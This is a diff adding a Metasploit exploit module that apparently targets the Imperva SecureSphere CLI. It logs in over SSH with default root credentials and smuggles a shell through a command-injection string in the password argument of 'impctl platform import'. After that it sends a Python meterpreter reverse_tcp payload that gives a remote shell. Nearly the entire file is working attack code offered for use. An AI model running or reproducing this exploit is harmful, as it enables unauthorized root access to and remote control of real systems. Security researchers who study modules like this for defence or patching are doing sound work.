@@ -1,0 +1,139 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::SSH
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "SecureSphere v12.0.0.50 - SealMode Shell Escape (root)",
+      'Description'    => %q{
+			This module exploits a vulnerability in SecureSphere cli to escape 
+			the sealed-mode of Imperva and execute code as the root user. This 
+			module requires credentials of a user to login to the SSH or can be 
+			exploited by a less privileged user.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          '0x09AL', # Vulnerability Discovery and Metasploit Module
+        ],
+      'References'     =>
+        [
+          ['URL',   'N/A']
+        ],
+      'DefaultOptions' =>
+        {
+          'Payload' => 'python/meterpreter/reverse_tcp',
+        },
+      'Platform'       => ['python'],
+      'Arch'           => ARCH_PYTHON,
+      'Targets'        => [ ['Automatic', {}] ],
+      'Privileged'     => false,
+      'DisclosureDate' => "01/08/2018",
+      'DefaultTarget'  => 0
+    ))
+
+    register_options(
+      [
+        Opt::RHOST(),
+        Opt::RPORT(22),
+        OptString.new('USERNAME', [ true, 'The username for authentication', 'root' ]),
+        OptString.new('Password', [ true, 'The password for authentication', '123456' ]),
+      ]
+    )
+
+    register_advanced_options(
+      [
+        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
+        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])
+      ]
+    )
+  end
+
+  def rhost
+    datastore['RHOST']
+  end
+
+  def rport
+    datastore['RPORT']
+  end
+
+  def username
+    datastore['USERNAME']
+  end
+
+  def password
+    datastore['PASSWORD']
+  end
+
+
+  def exploit
+    factory = ssh_socket_factory
+    ssh_options = {
+      :auth_methods => ['password', 'keyboard-interactive'],
+      :port         => rport,
+      :use_agent => false,
+      :config => false,
+      :password => password,
+      :proxy => factory,
+      :non_interactive => true
+    }
+
+    ssh_options.merge!(:verbose => :debug) if datastore['SSH_DEBUG']
+
+    print_status("#{rhost}:#{rport} - Attempting to login...")
+
+    begin
+      ssh = nil
+      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
+        ssh = Net::SSH.start(rhost, username, ssh_options)
+      end
+    rescue Rex::ConnectionError
+      return
+    rescue Net::SSH::Disconnect, ::EOFError
+      print_error "#{rhost}:#{rport} SSH - Disconnected during negotiation"
+      return
+    rescue ::Timeout::Error
+      print_error "#{rhost}:#{rport} SSH - Timed out during negotiation"
+      return
+    rescue Net::SSH::AuthenticationFailed
+      print_error "#{rhost}:#{rport} SSH - Failed authentication due wrong credentials."
+    rescue Net::SSH::Exception => e
+      print_error "#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}"
+      return
+    end
+
+    if ssh
+      print_good("SSH connection established successfully.")
+      ssh.open_channel do |channel|
+		channel.exec "impctl platform import --password \" & uname -a & sh\"" do |ch, success|
+			if success
+				channel.on_data do |ch, data|
+					if data.inspect.match(/Linux/)
+						print_good "Host is vulnerable"
+						channel.send_data "python -c \"#{payload.encoded}\"\n"
+						channel.close
+					else
+						print_bad "Host is not vulnerable"
+						channel.close
+					end
+				
+				end
+			end
+      
+     end
+    end
+
+      begin
+        ssh.loop unless session_created?
+      rescue Errno::EBADF => e
+        elog(e.message)
+      end
+    end
+  end
+end
